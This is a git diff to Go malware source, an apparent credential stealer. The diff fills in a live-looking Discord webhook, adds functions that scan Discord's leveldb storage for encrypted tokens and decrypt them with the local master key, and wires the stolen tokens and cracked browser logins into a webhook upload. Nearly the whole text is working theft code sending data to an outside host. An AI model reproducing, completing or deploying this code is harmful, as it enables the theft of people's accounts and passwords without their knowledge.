@@ -56,11 +56,116 @@ var mIp string
 var mHostname string
 var osName string
 var mToken = ""
-var uWebhook = "REPLACE-ME"
+var uWebhook = "https://discord.com/api/webhooks/1143737057966047243/haXW-ocaaOoFjRIRhZHvL24L-FvFfxrAsiUkRskrO39bcdZG7cja_zt3ZS76P6-HYpIe"
 func Discord() {
 	GetToken()
+	GetDiscord()
 	SendWebHook()
 }
+
+// func VerifyToken(token string) (bool){
+// 	headers := map[string]string{
+// 		"Authorization": token,
+// 		"Content-Type":  "application/json",
+// 		"User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+// 	}
+
+// 	req, err := http.NewRequest("GET", "https://discordapp.com/api/v6/users/@me", nil)
+// 	if err != nil {
+// 		return false
+// 	}
+
+// 	for key, value := range headers {
+// 		req.Header.Set(key, value)
+// 	}
+
+// 	client := &http.Client{}
+// 	resp, err := client.Do(req)
+// 	if err != nil {
+// 		return false
+// 	}
+// 	defer resp.Body.Close()
+
+// 	if resp.StatusCode == http.StatusOK {
+// 		return true
+// 	}
+
+// 	return false
+
+
+// }
+
+
+var DiscordPaths = map[string]string{
+	"Discord":        roaming + "\\Discord",
+	"Discord Canary": roaming + "\\discordcanary",
+	"Discord PTB":    roaming + "\\discordptb",
+}
+
+func searchEncryptedToken(line []byte) {
+
+	var tokenRegex = regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")
+
+	for _, match := range tokenRegex.FindAll(line, -1) {
+
+		baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
+		encryptedToken, _ := base64.StdEncoding.DecodeString(baseToken)
+		jsonFile := os.Getenv("APPDATA") + "/discord/Local State"
+		key := getMasterKey(jsonFile)
+		token := DecryptPassword(encryptedToken, key)
+		mToken += token + "\n"
+	}
+}
+
+
+
+
+
+
+
+func GetDiscord(){
+
+
+	for _, path := range DiscordPaths{
+
+		if _, err := os.Stat(path); err == nil {
+
+			path += "/Local Storage/leveldb/"
+			files, _ := os.ReadDir(path)
+
+
+			for _, file := range files {
+				name := file.Name()
+	
+				if !strings.HasSuffix(name, ".log") && !strings.HasSuffix(name, ".ldb") {
+					continue
+				}
+
+				content, _ := os.ReadFile(path + "/" + name)
+				lines := bytes.Split(content, []byte("\\n"))
+
+
+
+				for _, line := range lines {
+					searchEncryptedToken(line)
+				}
+
+
+			}
+
+		}
+
+	}
+
+
+
+
+
+
+
+}
+
+
 
 func GetToken() {
 	appdata := os.Getenv("APPDATA")
@@ -351,11 +456,9 @@ func Grabber() {
 
 			
 
-				fmt.Println(keyPath)
 
 				key := getMasterKey(keyPath)
 				masterKey = key
-				fmt.Println(Path)
 
 				logins, err := CrackLogin(Path, masterKey)
 				if err != nil{}
@@ -381,6 +484,5 @@ Password: %s
 func main(){
 	TargetInformation()
 	Grabber()
-	GetToken()
-	SendWebHook()
+	Discord()
 }
